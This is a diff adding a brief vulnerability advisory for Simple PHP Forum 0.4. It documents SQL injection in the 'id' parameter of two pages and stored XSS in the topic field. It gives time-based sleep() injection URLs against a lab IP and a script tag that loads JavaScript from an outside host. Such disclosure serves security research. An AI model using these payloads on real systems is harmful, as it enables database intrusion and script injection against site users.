@@ -1,0 +1,26 @@
+# Author: loneferret of Offensive Security
+# Product: sphpforum
+# Version: 0.4 (older versions may be affected)
+# 
+# Software Download: http://sourceforge.net/projects/sphpforum/
+
+# Description:
+# Simple PHP Forum is a PHP based forum/BBS board is designed to be small, simple, 
+# fast and allow easy integration into any existing web site.
+
+# Vulnerability:
+# Due to improper input sanitation, parameters are prone to SQL injection. Stored
+# crossed site scripting is also present in some forms.
+
+# PoC 1:
+# SQL Injection
+# Page: view_topic.php / view_profile.php?
+# Vulnerable param: 'id'
+# http://172.16.194.148/sphpforum/sphpforum-0.4/view_topic.php?id=50%27%20and%20sleep%2810%29%20and%20%271%27=%271
+# http://172.16.194.148/sphpforum/sphpforum-0.4/view_profile.php?id=loneferret%27%20and%20sleep%2810%29%20and%20%271%27=%271
+
+# PoC 2:
+# Stored XSS
+# Page: create_topic.php
+# Vulnerable field: Topic
+# Payload: <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
